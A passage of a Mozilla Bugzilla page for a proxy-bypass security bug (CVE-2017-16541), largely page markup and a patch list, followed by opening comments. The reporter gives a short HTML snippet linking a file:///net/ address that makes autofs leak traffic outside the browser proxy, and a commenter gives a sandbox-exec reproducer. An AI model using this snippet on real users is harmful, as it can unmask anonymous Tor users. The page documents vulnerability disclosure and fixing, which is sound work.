          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug." for="flag_type-803">sec-bounty</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-803-dirty">
      <select id="flag_type-803" name="flag_type-803"
        title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame." for="flag_type-913">sec-bounty-hof</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-913-dirty">
      <select id="flag_type-913" name="flag_type-913"
        title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-787">in-qa-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-787-dirty">
      <select id="flag_type-787" name="flag_type-787"
        title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>

      <td class="flag-requestee">
        <div id="requestee_type-787-container" style="display:none"><input
    name="requestee_type-787"
    value="" class="requestee bz_autocomplete_user"  id="requestee_type-787" 
  >
        </div>
      <td>

  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-37">in-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-37-dirty">
      <select id="flag_type-37" name="flag_type-37"
        title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually" for="flag_type-864">qe-verify</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-864-dirty">
      <select id="flag_type-864" name="flag_type-864"
        title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually"
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr>
    </tbody>
  </table>
</div>
        </span>
    </div>

  
</div>
</div>

  
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-crash-data"
>
    <header id="module-crash-data-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Crash Data section"
           data-label-collapsed="Expand Crash Data section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-crash-data-content"
             aria-expanded="false"
             aria-labeledby="module-crash-data-title"
             aria-describedby="module-crash-data-subtitle"></div>
        <h2 class="module-title" id="module-crash-data-title">Crash Data</h2>
      </div>
    </header>
  <div class="module-content" id="module-crash-data-content" style="display:none"
  ><div class="field edit-show" id="field-cf_crash_signature" style="display:none"
>
    <div class="name">Signature:
    </div>


  
    <div class="value">
        <span id="field-value-cf_crash_signature">
        </span>
    </div>

  
</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-security"
>
    <header id="module-security-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Security section"
           data-label-collapsed="Expand Security section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-security-content"
             aria-expanded="false"
             aria-labeledby="module-security-title"
             aria-describedby="module-security-subtitle"></div>
        <h2 class="module-title" id="module-security-title">Security</h2>
          <h3 class="module-subtitle" id="module-security-subtitle">
            (public)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-security-content" style="display:none"
  ><div class="groups edit-hide">
    This bug is publicly visible.
</div>

<div class="groups edit-show" style="display:none">


</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-user-story" data-non-stick="1"
>
    <header id="module-user-story-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse User Story section"
           data-label-collapsed="Expand User Story section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-user-story-content"
             aria-expanded="false"
             aria-labeledby="module-user-story-title"
             aria-describedby="module-user-story-subtitle"></div>
        <h2 class="module-title" id="module-user-story-title">User Story</h2>
      </div>
    </header>
  <div class="module-content" id="module-user-story-content" style="display:none"
  >
    <pre id="user-story"></pre>
  </div>
</section>







<section class="module" id="module-attachments"
>
    <header id="module-attachments-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Attachments section"
           data-label-collapsed="Expand Attachments section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-attachments-content"
             aria-expanded="true"
             aria-labeledby="module-attachments-title"
             aria-describedby="module-attachments-subtitle"></div>
        <h2 class="module-title" id="module-attachments-title">Attachments</h2>
          <h3 class="module-subtitle" id="module-attachments-subtitle">
            (6 files, 6 obsolete files)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-attachments-content"
  ><table role="table" class="layout-table" id="attachments">
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8922957">0001-Test-for-bug-1412081.patch</a>
        </div>
        <div>
            <a href="#c27" class="attach-time activity-ref"><span class="rel-time" title="2017-10-27 13:59 PDT" data-time="1509137948">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_349211" ><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div></span>
        </div>
        <div class="attach-info">1.90 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8922957&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8922957&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8922957">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8979286">WIP-patch-and-gtest</a>
        </div>
        <div>
            <a href="#c65" class="attach-time activity-ref"><span class="rel-time" title="2018-05-21 08:58 PDT" data-time="1526918294">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_415378" ><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">18.04 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8979286&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8979286&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8979286">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8985964">patch</a>
        </div>
        <div>
            <a href="#c68" class="attach-time activity-ref"><span class="rel-time" title="2018-06-18 09:28 PDT" data-time="1529339333">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_415378" ><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">17.75 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_269762" ><span class="fn">mayhemer</span>
</div>:
              <a href="#c70"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1529339333"
            >
              review+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8985964&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8985964&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8985964">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8986314">patch</a>
        </div>
        <div>
            <a href="#c72" class="attach-time activity-ref"><span class="rel-time" title="2018-06-19 15:48 PDT" data-time="1529448528">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_415378" ><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">27.29 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8986314&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8986314&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986314">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8986337">patch</a>
        </div>
        <div>
            <a href="#c76" class="attach-time activity-ref"><span class="rel-time" title="2018-06-19 17:52 PDT" data-time="1529455948">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_415378" ><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">27.55 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8986337&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8986337&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986337">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8986493">[ESR60]  patch</a>
        </div>
        <div>
            <a href="#c82" class="attach-time activity-ref"><span class="rel-time" title="2018-06-20 09:20 PDT" data-time="1529511655">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_415378" ><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">28.91 KB,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8986493&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8986493&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986493">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8986596">[ESR60]  patch</a>
        </div>
        <div>
            <a href="#c87" class="attach-time activity-ref"><span class="rel-time" title="2018-06-20 15:11 PDT" data-time="1529532679">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_415378" ><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">29.70 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_465500" ><span class="fn">bkelly</span>
</div>:
              <a href="#c88"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1529532679"
            >
              review+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8986596&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8986596&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986596">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8990057">Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms</a>
        </div>
        <div>
            <a href="#c92" class="attach-time activity-ref"><span class="rel-time" title="2018-07-05 10:32 PDT" data-time="1530811948">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_415378" ><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">1.27 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_279663" ><span class="fn">jimm</span>
</div>:
              <a href="#a22377217_279663"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1530811948"
            >
              review+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_451704" ><span class="fn">lizzard</span>
</div>:
              <a href="#a23057290_451704"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1532103224"
            >
              approval-mozilla-beta+</a>
          </div>
          <div class="attach-flag"><div class="vcard vcard_75935" ><span class="fn">RyanVM</span>
</div>:
              <a href="#a24623039_75935"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1533668973"
            >
              approval-mozilla-esr60+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8990057&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8990057&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8990057">Splinter Review</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8990058">Add ability to blacklist file paths on Unix platforms</a>
        </div>
        <div>
            <a href="#c93" class="attach-time activity-ref"><span class="rel-time" title="2018-07-05 10:35 PDT" data-time="1530812151">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_415378" ><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">27.61 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_269762" ><span class="fn">mayhemer</span>
</div>:
              <a href="#c94"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1530812151"
            >
              review+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8990058&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8990058&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8990058">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8993177">Add ability to blacklist file paths on Unix platforms</a>
        </div>
        <div>
            <a href="#c100" class="attach-time activity-ref"><span class="rel-time" title="2018-07-18 16:33 PDT" data-time="1531956787">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_415378" ><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">27.56 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_451704" ><span class="fn">lizzard</span>
</div>:
              <a href="#c106"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1532032149"
            >
              approval-mozilla-beta+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8993177&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8993177&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8993177">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8993178">[ESR60]  patch</a>
        </div>
        <div>
            <a href="#c102" class="attach-time activity-ref"><span class="rel-time" title="2018-07-18 16:41 PDT" data-time="1531957276">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_415378" ><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">29.73 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_75935" ><span class="fn">RyanVM</span>
</div>:
              <a href="#c116"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1532032448"
            >
              approval-mozilla-esr60+</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8993178&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8993178&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8993178">Splinter Review</a>
    </tr>
    <tr class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8998347">esr_fix.patch</a>
        </div>
        <div>
            <a href="#c120" class="attach-time activity-ref"><span class="rel-time" title="2018-08-07 13:59 PDT" data-time="1533675576">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_415378" ><a class="email " href="/user_profile?user_id=415378" > <span class="fna">Valentin Gosu [:valentin] (he/him)</span></a>
</div></span>
        </div>
        <div class="attach-info">963 bytes,
          patch        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8998347&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8998347&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8998347">Splinter Review</a>
    </tr>
</table>

<footer id="attachments-footer">
  <div id="attachments-actions">
      <button type="button" id="attachments-obsolete-btn" class="secondary">Show Obsolete</button>
  </div>
  
</footer>
  </div>
</section>



<script nonce="dzz9woI8rbR5nZ87hL8MKU8QpfVNBHtMUMgYThyzAzYuiZsa">
  init_module_visibility();
</script>



<meta name="firefox-versions" content="{&quot;FIREFOX_AURORA&quot;:&quot;&quot;,&quot;FIREFOX_DEVEDITION&quot;:&quot;94.0b9&quot;,&quot;FIREFOX_ESR&quot;:&quot;78.15.0esr&quot;,&quot;FIREFOX_ESR_NEXT&quot;:&quot;91.2.0esr&quot;,&quot;FIREFOX_NIGHTLY&quot;:&quot;95.0a1&quot;,&quot;FIREFOX_PINEBUILD&quot;:&quot;&quot;,&quot;LAST_MERGE_DATE&quot;:&quot;2021-10-04&quot;,&quot;LAST_RELEASE_DATE&quot;:&quot;2021-10-05&quot;,&quot;LAST_SOFTFREEZE_DATE&quot;:&quot;2021-09-30&quot;,&quot;LATEST_FIREFOX_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_OLDER_VERSION&quot;:&quot;3.6.28&quot;,&quot;LATEST_FIREFOX_RELEASED_DEVEL_VERSION&quot;:&quot;94.0b9&quot;,&quot;LATEST_FIREFOX_VERSION&quot;:&quot;93.0&quot;,&quot;NEXT_MERGE_DATE&quot;:&quot;2021-11-01&quot;,&quot;NEXT_RELEASE_DATE&quot;:&quot;2021-11-02&quot;,&quot;NEXT_SOFTFREEZE_DATE&quot;:&quot;2021-10-28&quot;}">


<div id="comment-actions">
    <button type="button" id="bottom-btn" class="secondary" aria-label="Go to Page Bottom">Bottom &darr;</button>
  <div class="dropdown">
    <button type="button" id="comment-tags-btn" aria-haspopup="true" aria-label="Tags"
      aria-expanded="false" aria-controls="comment-tags-menu" class="dropdown-button minor">Tags &#9662;</button>
    <ul id="comment-tags-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a role="menuitem" tabindex="-1" data-comment-tag="">Reset</a>
      </li>
    </ul>
  </div>
  <div class="dropdown">
    <button type="button" id="view-menu-btn" aria-haspopup="true" aria-label="Timeline"
      aria-expanded="false" aria-controls="view-menu" class="dropdown-button minor">Timeline &#9662;</button>
    <ul id="view-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a id="view-reset" role="menuitem" tabindex="-1">Reset</a>
      </li>
      <li role="separator"></li>
      <li role="presentation">
        <a id="view-collapse-all" role="menuitem" tabindex="-1">Collapse All</a>
      </li>
      <li role="presentation">
        <a id="view-expand-all" role="menuitem" tabindex="-1">Expand All</a>
      </li>
      <li role="presentation">
        <a id="view-comments-only" role="menuitem" tabindex="-1">Comments Only</a>
      </li>
    </ul>
   </div>
</div>
<div class="change-set" id="c0"><div class="comment" data-id="12793608" data-no="0"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-0" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_474980" ><img src="https://secure.gravatar.com/avatar/dfcd4ae2df9a810044e19c011304881e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_474980" ><a class="email " href="/user_profile?user_id=474980" > <span class="fna">Arthur Edelstein [:arthur]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-0"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-0" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c0">Description</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-26 12:25 PDT" data-time="1509045934">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-0">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-0" data-comment-id="12793608">Tor Project received a third-party report of a method for content pages to bypass the proxy. STR:

Create a web page with the following:
&lt;head&gt;
&lt;link href='file:///net/12.12.12.12/a.css' rel='stylesheet'&gt;
&lt;/head&gt;

Run a &quot;tcpdump port 111&quot; on 12.12.12.12. UDP events are observed that did not pass through the browser proxy.

(A demo is at <a rel="nofollow" href="https://pearlcrescent.com/tor/am.html">https://pearlcrescent.com/tor/am.html</a>)

I also observed the same thing for &lt;img&gt; tags. This behavior apparently is caused by automount/autofs, which is enabled by default on macOS and installable on Linux.

More information from a colleague:

My quick test on OSX 10.12.x shows that Chrome and Safari (latest versions) are not affected.

It is also interesting that I see the following message in the browser console after the page load completes (i.e., after it gives up on the automounted file):

Security Error: Content at <a rel="nofollow" href="https://pearlcrescent.com/tor/am.html">https://pearlcrescent.com/tor/am.html</a> may not load or link to file:///net/192.168.1.43/a.css.

Access is blocked (i.e., the CSS does not load, the image does not load), but only after an attempt has been made to open the file (or maybe just traverse its path.</pre></div><div class="change-set" id="c1"><div class="comment" data-id="12793692" data-no="1"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-1" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" ><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" ><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-1"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-1" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c1">Comment 1</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-26 12:55 PDT" data-time="1509047756">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-1">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-1" data-comment-id="12793692">Ouch, I was able to reproduce. There seems to me to be three things going on here:

a) Why are we loading pages that will generate security errors?

b) Is an HTTP page triggering opening a file content process? If so, I think that's a bug, as those will requests will always generate security errors. (I originally thought it was, but now that I see (c) it's possible this is all happening in the sandboxed process)

c) A kernel bug on macOS that sandboxed processes are able to trigger automount, minimal reproducer:

sandbox-exec -p '(version 1) (deny default) (allow process-exec* (path &quot;/usr/bin/stat&quot;)) (allow file-read* (subpath &quot;/usr&quot;) (subpath &quot;/System&quot;) (subpath &quot;/private/var/db/dyld&quot;))' /usr/bin/stat /net/12.12.12.12/a.css

I can see that triggering things in the TCP dump.</pre></div><div class="change-set" id="c2"><div class="comment" data-id="12793752" data-no="2"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-2" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" ><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" ><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-2"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-2" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c2">Comment 2</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-26 13:13 PDT" data-time="1509048790">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-2">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-2" data-comment-id="12793752">Arthur, do you or the original reporter want to report (c) to Apple, or shall I?</pre></div><div class="change-set" id="c3"><div class="comment" data-id="12793773" data-no="3"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-3" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_349211" ><img src="https://secure.gravatar.com/avatar/34a87f79fc3dd6985e4a1af2b4870a19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_349211" ><a class="email " href="/user_profile?user_id=349211" > <span class="fna">Georg Koppen</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-3"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-3" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1412081#c3">Comment 3</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-10-26 13:20 PDT" data-time="1509049205">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-3">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-3" data-comment-id="12793773">(In reply to Alex Gaynor [:Alex_Gaynor] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"
   href="/show_bug.cgi?id=1412081#c2">comment #2</a>)
<span class="quote">&gt; Arthur, do you or the original reporter want to report (c) to Apple, or
&gt; shall I?</span >

Feel free to do so.</pre></div><div class="change-set" id="c4"><div class="comment" data-id="12793911" data-no="4"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-4" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_4418" ><img src="https://secure.gravatar.com/avatar/4febbd86c096511a281d5921a0fd3824?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

